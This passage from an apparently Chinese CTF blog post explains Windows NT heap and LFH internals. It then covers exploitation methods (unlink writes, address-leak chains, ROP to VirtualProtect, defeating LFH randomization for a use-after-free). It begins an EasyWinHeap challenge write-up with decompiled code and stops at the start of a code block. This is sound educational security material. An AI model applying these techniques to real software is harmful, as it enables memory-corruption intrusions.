title="_HEAP-&gt;BlocksIndex"></a>_HEAP-&gt;BlocksIndex</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x38 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_LIST_LOOKUP</span>* <span class="title">ExtendedLookup</span>;</span>                               <span class="comment">//0x0</span></span><br><span class="line">    ULONG ArraySize;                                                        <span class="comment">//0x8</span></span><br><span class="line">    ULONG ExtraItem;                                                        <span class="comment">//0xc</span></span><br><span class="line">    ULONG ItemCount;                                                        <span class="comment">//0x10</span></span><br><span class="line">    ULONG OutOfRangeItems;                                                  <span class="comment">//0x14</span></span><br><span class="line">    ULONG BaseIndex;                                                        <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>* <span class="title">ListHead</span>;</span>                                           <span class="comment">//0x20</span></span><br><span class="line">    ULONG* ListsInUseUlong;                                                 <span class="comment">//0x28</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span>** <span class="title">ListHints</span>;</span>                                         <span class="comment">//0x30</span></span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><p><code>ExtendedLookup</code>指向下一个ExtendedLookup，通常下一个会管理更大块chunk</p><p><code>ArraySize</code>该结构管理的最大chunk的大小，通常为0x80（实际上是0x800）</p><p><code>ItemCount</code>目前该结构所管理的chunk数</p><p><code>OutofRangeItems</code>是超出该结构所管理大小的chunk数量</p><p><code>BaseIndex</code>该结构所管理chunk的起始index</p><p><code>ListHead</code>指向FreeList的Head</p><p><code>ListsInUseUlong</code>用来判断ListHint中是否有合适大小的chunk，是一个bitmap</p><p><code>ListHint</code>用来指向相对应大小的chunk array，大小为0x10为一个间隔</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519074.png" alt="image-20250508162938606" style="zoom:50%;" /><h4 id="分配机制"><a href="#分配机制" class="headerlink" title="分配机制"></a>分配机制</h4><p>基本上分为三种：</p><ul><li>Size&lt;&#x3D;0x4000</li><li>0x4000 &lt; size &lt;&#x3D;0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size"><a href="#Size" class="headerlink" title="Size &lt;&#x3D; 0x4000"></a>Size &lt;&#x3D; 0x4000</h5><ul><li><p>首先会看该Size对应的<code>FrontEndHeapStatusBitmap</code>是否启用了LFH</p><ul><li>没有的话，会对对应的<code>FrontEndHeapUsageData</code>加上0x21</li><li>并且检查值是否超过<code>0xff00</code>或<code>&amp;0x1f</code>后超过0x10，如果通过这个条件就会启用LFH</li></ul></li><li><p>接下来会看对应的<code>ListHint</code>是否有值，会以<code>ListHint</code>中的<code>chunk</code>为优先</p></li><li><p>如果有值，就会看该chunk的<code>Flink</code>大小是否刚好也是同样的Size</p><ul><li><p>如果是的话，就会将该ListHint填上Flink的值（1）</p></li><li><p>不是则清空ListHint（2）</p></li><li><p>最后则<code>unlink</code>该chunk，把这块chunk从<code>linked list</code>中移除，返回给使用者，并将header异或回去</p></li></ul></li><li><p>如果没有刚好适合的</p><ul><li>从比较大的<code>ListHint</code>中找，有找到就执行（1）（2）</li><li>然后将该chunk进行<strong>切割</strong>，剩下大小重新加入Freelist，如果可以放进ListHint就会放进去</li><li>最后回传切割好的chunk给使用者，并将header异或回去</li></ul></li><li><p>如果Freelist中都没有</p><ul><li>尝试<code>ExtendHeap</code>加大Heap空间</li><li>再从<code>extend</code>出来的chunk拿</li><li>接着后面一样切割，放回<code>ListHint</code>，还原Header</li></ul></li></ul><h5 id="0x4000-size"><a href="#0x4000-size" class="headerlink" title="0x4000 &lt; size &lt;&#x3D;0xff000"></a>0x4000 &lt; size &lt;&#x3D;0xff000</h5><ul><li>除了没有对LFH相关操作外，其余都跟0x4000一样</li></ul><h5 id="Size-0xff000"><a href="#Size-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>直接使用<code>ZwAllocateVirtualThreshold</code></li><li>类似mmap直接给一大块，并且会插入<code>_HEAP-&gt;VirtualAllocdBlocks</code>这个<code>linked list</code>中<ul><li>这个linked list是串接该<code>Heap VirtualAllocate</code>出来的区段用的</li></ul></li></ul><h4 id="Free机制"><a href="#Free机制" class="headerlink" title="Free机制"></a>Free机制</h4><p>可分为两种：</p><ul><li>Size &lt;&#x3D; 0xff000</li><li>Size &gt; 0xff000</li></ul><h5 id="Size-1"><a href="#Size-1" class="headerlink" title="Size &lt;&#x3D; 0xff000"></a>Size &lt;&#x3D; 0xff000</h5><ul><li><p>会先<strong>检查</strong>alignment，利用unused byte判断该chunk状态</p><ul><li>如果是LFH下，对应的FrontEndHeapUsageData减1</li><li>接着会判断前后的chunk是否为freed，是的话合并<ul><li>此时会把可以合并的chunk做unlink，并将ListHint移除</li><li>移除方式与前面相同，看看下一块是不是同样大小，使得话补上ListHint</li></ul></li></ul></li><li><p>合并完，update size和prevsize，然后会看看是不是在FreeList的最前或最后，是的话就插入FreeList，不是就从ListHint中插入，并且update ListHint，插入时也会对<code>linked list</code>做<strong>检查</strong></p><ul><li>但是这个检查不会abort，其原因是如果检查失败是不会做unlink写入的</li></ul></li></ul><h5 id="Size-0xff000-1"><a href="#Size-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h5><ul><li>检查该chunk的linked list，并从<code>_HEAP-&gt;VirtualAllocdBlocks</code>移除</li><li>接着使用<code>RtlpSecaMemFreeVirtualMemory</code>将chunk整个munmap掉</li></ul><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><h4 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h4><p>基本上与Linux中的unlink很类似，绕过方法差不多，简而言之是利用从linked list移除node的行为来做有限制的写入</p><p>要注意的是在会decode的地方，都要让他正常decode，也就是check sum要通过</p><p>另外一点是<strong>Flink及Blink</strong>并不是指向chunk开头，而是<strong>直接指向User data部分</strong>，也就是不太需要做偏移伪造chunk，所以找到一个指向该userdata的pointer让他绕过double linked list的验证就好了</p><p>一般来说Unlink完之后就有任意地址读写了，基本getshell的方法都是通过ROP，那么就要泄露地址</p><ul><li>代码地址<ul><li><code>PEB --&gt; text</code></li></ul></li><li>共享库地址<ul><li><code>text --&gt; IAT --&gt; xxx.dll --&gt; xxx.dll</code></li><li><code>_HEAP-&gt;LockVariable.Lock --&gt; ntdll.dll</code></li><li><code>CrticalSection-&gt;DebugInfo --&gt; ntdll.dll</code></li></ul></li><li>栈地址<ul><li><code>Kernel32.dll --&gt; kernelbase.dll --&gt; KERNELBASE!BasepFilterInfo --&gt; stack address</code></li><li><code>kernel32.dll --&gt; ntdll.dll --&gt; ntdll!PebLdr --&gt; PEB --&gt; TEB --&gt; stack address</code></li></ul></li></ul><p>要么纯ROP到getshell，要么ROP to VirtualProtect&#x2F;VirtualAlloc，然后Jmp to shellcode</p><h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front-End"></a>Front-End</h3><ul><li>在非Debug下才会enable</li><li>Size &lt; 0x4000</li></ul><h4 id="数据结构-1"><a href="#数据结构-1" class="headerlink" title="数据结构"></a>数据结构</h4><h5 id="LFH-HEAP"><a href="#LFH-HEAP" class="headerlink" title="_LFH_HEAP"></a>_LFH_HEAP</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _LFH_HEAP</span><br><span class="line">ntdll!_LFH_HEAP</span><br><span class="line">   +<span class="number">0x000</span> Lock             : _RTL_SRWLOCK</span><br><span class="line">   +<span class="number">0x008</span> SubSegmentZones  : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> Heap             : Ptr64 Void</span><br><span class="line">   +<span class="number">0x020</span> NextSegmentInfoArrayAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x028</span> FirstUncommittedAddress : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedAddressLimit : Ptr64 Void</span><br><span class="line">   +<span class="number">0x038</span> SegmentCreate    : Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> SegmentDelete    : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> MinimumCacheDepth : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> CacheShiftThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x048</span> SizeInCache      : Uint8B</span><br><span class="line">   +<span class="number">0x050</span> RunInfo          : _HEAP_BUCKET_RUN_INFO</span><br><span class="line">   +<span class="number">0x060</span> UserBlockCache   : [<span class="number">12</span>] _USER_MEMORY_CACHE_ENTRY</span><br><span class="line">   +<span class="number">0x2a0</span> MemoryPolicies   : _HEAP_LFH_MEM_POLICIES</span><br><span class="line">   +<span class="number">0x2a4</span> Buckets          : [<span class="number">129</span>] _HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x4a8</span> SegmentInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x8b0</span> AffinitizedInfoArrays : [<span class="number">129</span>] Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0xcb8</span> SegmentAllocator : Ptr64 _SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0xcc0</span> LocalData        : [<span class="number">1</span>] _HEAP_LOCAL_DATA</span><br></pre></td></tr></table></figure><p><code>Heap</code>指向对应的<code>_HEAP</code></p><p><code>Buckets</code>用来寻找配置大小对应到Block的阵列结构</p><p><code>SegmentInfoArrays</code>不同大小对应到不同的Segment_info结构，主要管理对应的Subsegment</p><p><code>LocalData</code>其中有个成员是指向LFH本身，用来找回LFH</p><h5 id="HEAP-BUCKET"><a href="#HEAP-BUCKET" class="headerlink" title="_HEAP_BUCKET"></a>_HEAP_BUCKET</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_BUCKET</span><br><span class="line">   +<span class="number">0x000</span> BlockUnits       : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x003</span> UseAffinity      : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x003</span> DebugFlags       : Pos <span class="number">1</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x003</span> Flags            : UChar</span><br></pre></td></tr></table></figure><p><code>BlockUnits</code>要分配出去的一个block大小&gt;&gt;4</p><p><code>SizeIndex</code>使用者需要的大小&gt;&gt;4</p><h5 id="HEAP-LOCAL-SEGMENT-INFO"><a href="#HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="_HEAP_LOCAL_SEGMENT_INFO"></a>_HEAP_LOCAL_SEGMENT_INFO</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x000</span> LocalData        : Ptr64 _HEAP_LOCAL_DATA</span><br><span class="line">   +<span class="number">0x008</span> ActiveSubsegment : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x010</span> CachedItems      : [<span class="number">16</span>] Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x090</span> SListHeader      : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x0a0</span> Counters         : _HEAP_BUCKET_COUNTERS</span><br><span class="line">   +<span class="number">0x0a8</span> LastOpSequence   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> BucketIndex      : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> LastUsed         : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> NoThrashCount    : Uint2B</span><br></pre></td></tr></table></figure><p><code>LocalData</code>对应到<code>_LFH_HEAP-&gt;LocalData</code> 方便从Segmentinfo找回<code>_LFH_HEAP</code></p><p><code>BucketIndex</code>是这个数组对应的BucketIndex，也就是<code>_LFH_HEAP-&gt;SegmentInfoArrays</code>数组中对应的下标</p><p><code>ActiveSubsegment</code>一个<code>_HEAP_SUBSEGMENT</code>结构体，对应到分配出去的Subsegment，记录了剩余多少chunk，该Userblock最大分配数等等</p><p><code>CachedItems</code>一个<code>_HEAP_SUBSEGEMENT</code>结构体数组，存放对应到该SegmentInfo且还有可以分配chunk给user的Subsegment，当ActiveSubsegment用完之后就会从这里填充置换掉</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519075.png" alt="image-20250509160224918" style="zoom:50%;" /><h5 id="HEAP-SUBSEGMENT"><a href="#HEAP-SUBSEGMENT" class="headerlink" title="_HEAP_SUBSEGMENT"></a>_HEAP_SUBSEGMENT</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x000</span> LocalInfo        : Ptr64 _HEAP_LOCAL_SEGMENT_INFO</span><br><span class="line">   +<span class="number">0x008</span> UserBlocks       : Ptr64 _HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x010</span> DelayFreeList    : _SLIST_HEADER</span><br><span class="line">   +<span class="number">0x020</span> AggregateExchg   : _INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x024</span> BlockSize        : Uint2B</span><br><span class="line">   +<span class="number">0x026</span> Flags            : Uint2B</span><br><span class="line">   +<span class="number">0x028</span> BlockCount       : Uint2B</span><br><span class="line">   +<span class="number">0x02a</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x02b</span> AffinityIndex    : UChar</span><br><span class="line">   +<span class="number">0x024</span> Alignment        : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> Lock             : Uint4B</span><br><span class="line">   +<span class="number">0x030</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br></pre></td></tr></table></figure><p><code>LocalInfo</code>指回对应的<code>_HEAP_LOCAL_SEGMENT_INFO</code></p><p><code>UserBlocks</code>一个<code>_HEAP_USERDATA_HEADER</code>结构体，LFH的分配池，也就是要分配出去的Chunk所在的位置</p><p><code>AggregateExchg</code>用来管理对应的UserBlock中还有多少的freed chunk可以分配</p><p><code>BlockCount</code>在该UserBlock中每个Block（chunk）的大小</p><p><code>BlockCount</code>在该UserBlock中Block的总数</p><p><code>SizeIndex</code>该UserBlock对应到的SizeIndex，也就是<code>CachedItems</code>数组的下标</p><h5 id="INTERLOCK-SEQ"><a href="#INTERLOCK-SEQ" class="headerlink" title="_INTERLOCK_SEQ"></a>_INTERLOCK_SEQ</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_INTERLOCK_SEQ</span><br><span class="line">   +<span class="number">0x000</span> Depth            : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Hint             : Pos <span class="number">0</span>, <span class="number">15</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> Lock             : Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x002</span> Hint16           : Uint2B</span><br><span class="line">   +<span class="number">0x000</span> Exchg            : Int4B</span><br></pre></td></tr></table></figure><p><code>Depth</code>该UserBlock中所剩下的Freed chunk数量</p><p><code>Lock</code>就是锁</p><h5 id="HEAP-USERDATA-HEADER"><a href="#HEAP-USERDATA-HEADER" class="headerlink" title="_HEAP_USERDATA_HEADER"></a>_HEAP_USERDATA_HEADER</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_HEAP_USERDATA_HEADER</span><br><span class="line">   +<span class="number">0x000</span> SFreeListEntry   : _SINGLE_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> SubSegment       : Ptr64 _HEAP_SUBSEGMENT</span><br><span class="line">   +<span class="number">0x008</span> Reserved         : Ptr64 Void</span><br><span class="line">   +<span class="number">0x010</span> SizeIndexAndPadding : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> SizeIndex        : UChar</span><br><span class="line">   +<span class="number">0x011</span> GuardPagePresent : UChar</span><br><span class="line">   +<span class="number">0x012</span> PaddingBytes     : Uint2B</span><br><span class="line">   +<span class="number">0x014</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> EncodedOffsets   : _HEAP_USERDATA_OFFSETS</span><br><span class="line">   +<span class="number">0x020</span> BusyBitmap       : _RTL_BITMAP_EX</span><br><span class="line">   +<span class="number">0x030</span> BitmapData       : [<span class="number">1</span>] Uint8B</span><br></pre></td></tr></table></figure><p><code>SubSegment</code>指回这个结构体所在的<code>SubSegment</code></p><p><code>EncodeOffsets</code>用来验证该chunkheader是否被修改过</p><p><code>BusyBitmap</code>记录该UserBlock哪些chunk有在用的bitmap</p><h5 id="HEAP-ENTRY-chunk-1"><a href="#HEAP-ENTRY-chunk-1" class="headerlink" title="_HEAP_ENTRY(chunk)"></a>_HEAP_ENTRY(chunk)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">HEAP_ENTRY</span>&#123;</span></span><br><span class="line">    <span class="type">void</span> * PreviousBlockPrivateData;</span><br><span class="line">    Uint4B SubSegmentCode;</span><br><span class="line">    Uint2B PreviousSize;</span><br><span class="line">    Uchar SegmentOffset;</span><br><span class="line">    Uchar Unusedbyte;</span><br><span class="line">    Uchar UserData[];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SubSegmentCode</code>是Encode过的metadata用来推回userblock的位置</p><p><code>PreviousSize</code>是该chunk在UserBlock中的index</p><p><code>Unusedbyte</code>来判断该LFH chunk状态</p><ul><li><code>Freed</code>, 恒为<code>0x80</code></li><li><code>Inused</code>, <code>UnusedBytes &amp; 0x80 != 0</code></li></ul><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519076.png" alt="image-20250509161925186" style="zoom:50%;" /><h5 id="remark"><a href="#remark" class="headerlink" title="remark"></a>remark</h5><p>EncodedOffsets在UserBlock初始化时设置，其值是以下四个值的xor</p><ul><li><code>(sizeof(userblock header)|(BlockUnit*0x10&lt;&lt;16))</code></li><li><code>LFHkey</code></li><li><code>UserBlock address</code></li><li><code>_LFH_HEAP address</code></li></ul><p>所有的chunk header在初始化时都会经过xor，为下面四个值的xor</p><ul><li><code>_HEAP address</code></li><li><code>LFHkey</code></li><li><code>Chunk address &gt;&gt; 4</code></li><li><code>((chunk address) - (UserBlock address)) &lt;&lt; 12</code></li></ul><h4 id="分配机制-1"><a href="#分配机制-1" class="headerlink" title="分配机制"></a>分配机制</h4><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><ul><li>在<code>FrintEndHeapUsageData[x] &amp; 0x1f &gt; 0x10</code>时，下一次<code>allocate</code>会对<code>LFH</code>做出初始化<ul><li>会先<code>ExtendFrontEndUsageData</code>及增加更大的<code>BlocksIndex</code>  (0x80-0x400)</li><li>建立<code>FrontEndHeap</code></li><li>初始化<code>SegmentInfoArrays[idx]</code></li></ul></li><li>接下来在allocate相同大小的chunk就会开始使用LFH</li></ul><p>在第17次的malloc同一个size的时候，此时对应的<code>FrontEndHeapUsageData[x]=0x231 &amp; 0x1f &gt; 0x10</code>，然后<code>heap-&gt;CompatibilityFlag |= 0x20000000</code>，设置上这个flag后，下次allocate就会去初始化LFH</p><p>malloc同一个size第18次时</p><ul><li><code>ExtendFrontEndUsageData</code>及增加更大的<code>BlocksIndex</code>（0x80-0x400），并设置对应的<code>bitmap</code><ul><li>并在对应的<code>FrontEndHeapUsageData</code>写上对应的index，此时可<code>enable LFH</code>范围变为（idx：0-0x400）</li></ul></li><li>建立并初始化 <code>FrontEndHeap</code>（mmap）</li><li>初始化<code>SegmentInfoArrays[idx]</code><ul><li>在<code>SegmentInfoArrays[BucketIndex]</code> 填上<code>segmentInfo</code></li></ul></li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519077.png" alt="image-20250509195843208"></p><p>malloc同一个size第19次时</p><ul><li>Allocate Userblock 并初始化<ul><li>设置对应的chunk</li></ul></li><li>设置对应的ActiviteSubsegment</li><li>随机返回其中的一个chunk</li></ul><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202505101519078.png" alt="image-20250509200159429"></p><h5 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h5><ul><li>先看看<code>ActiveSubsegment</code>中是否有可分配的chunk<ul><li>从<code>ActiveSubsegment-&gt;depth</code>判断</li></ul></li><li>如果没有则会从<code>CachedItem</code>找，有找到的话会把<code>ActiveSubsegment</code>换成<code>CachedItem</code>中的<code>subsegment</code></li><li>取得<code>RtlpLowFragHeapRandomData[x]</code>上的值，下一次会从<code>RtlpLowFragHeapRandomData[x+1]</code>取，当下一次轮回时<code>x=rand()%256</code>开始取，x是一个byte的，范围在<code>0x00-0x7f</code></li><li>最后的index为<code>RtlpLowFragHeapRandomData[x]*maxidx&gt;&gt;7</code>，如果冲突则往后取最近的</li><li>检查<code>(unused byte &amp; 0x3f) != 0</code>表示chunk是freed</li><li>最后设置index及unsed byte就返回给用户了</li></ul><h5 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h5><ul><li>用chunk header寻找UserBlock，然后找回对应的SubSegment，设置<code>unused byte=0x80</code>，清除对应的bitmap，<code>update AggregateExchg</code></li><li>ActiveSubsegment并不等于就是free掉chunk的subsegment</li></ul><h4 id="Front-End-Exploitation"><a href="#Front-End-Exploitation" class="headerlink" title="Front-End Exploitation"></a>Front-End Exploitation</h4><p>假设我们拥有Use after free的漏洞，但是因为LFH的随机性，我们无法预测下一块chunk在哪里，使得我们难以利用</p><p>这时我们可以通过填满Userblock的方式，在free掉其中一块，那么下一次该chunk必定会拿到同一块，我们可以利用这个特性，拿到overlap chunk并进一步利用</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="2020SCTF-EasyWinHeap"><a href="#2020SCTF-EasyWinHeap" class="headerlink" title="2020SCTF_EasyWinHeap"></a>2020SCTF_EasyWinHeap</h3><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    heapIndex = <span class="number">0</span>;</span><br><span class="line">    heapEntry = &amp;MyHeapEntry_0[<span class="number">1</span>].content;  <span class="comment">// 跳过12个字节</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">......</span><br><span class="line">printString(<span class="string">&quot;size &gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)allocSizeBuffer);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)allocSizeBuffer &gt; <span class="number">0x90</span>u )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sizeRoundedUp = (*(_DWORD *)allocSizeBuffer &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">    allocatedBlock = HeapAlloc(hHeap, <span class="number">1u</span>, sizeRoundedUp);<span class="comment">// 分配的chunk的size会&gt;&gt;4</span></span><br><span class="line">    heapBase = MyHeapEntry_0;</span><br><span class="line">    MyHeapEntry_0[heapIndex].func_ptr = (<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">puts</span> | sizeRoundedUp);</span><br><span class="line">    heapBase[heapIndex].content = allocatedBlock;</span><br></pre></td></tr></table></figure><p>省略部分有一个堆条目的查找，可能是因为编译器优化的原因，导致十分复杂，但大致逻辑是一次检查多个条目，根据第一个寻找到的空位置来调整索引值</p><p>看到这个分配逻辑，有个<code>func_ptr</code>感觉或许有点用，其中要注意的是 我们输入的Size会&gt;&gt;4)+1然后与puts进行或的操作，对比下述的show操作，可以知道这个func_ptr的低位是size位，但是问题在于此时HeapAlloc的size是<strong>处理过的size</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)deleteIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)deleteIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  HeapFree(hHeap, <span class="number">1u</span>, MyHeapEntry_0[*(_DWORD *)deleteIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>这个delete的逻辑，显然是一个UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  printString(<span class="string">&quot;index &gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%ud&quot;</span>, (<span class="type">char</span>)showIndexBuffer);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)showIndexBuffer &gt;= <span class="number">0x10</span>u || !MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br><span class="line">  ((<span class="type">void</span> (__cdecl *)(<span class="type">void</span> *))((<span class="type">int</span>)MyHeapEntry_0[*(_DWORD *)showIndexBuffer].func_ptr &amp; <span class="number">0xFFFFFFF0</span>))(MyHeapEntry_0[*(_DWORD *)showIndexBuffer].heap_addr);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>这个show是通过直接调用这个上面提到的<code>func_ptr</code>的，那么如果能hijack这个结构体，就能做到一个getcmd的操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 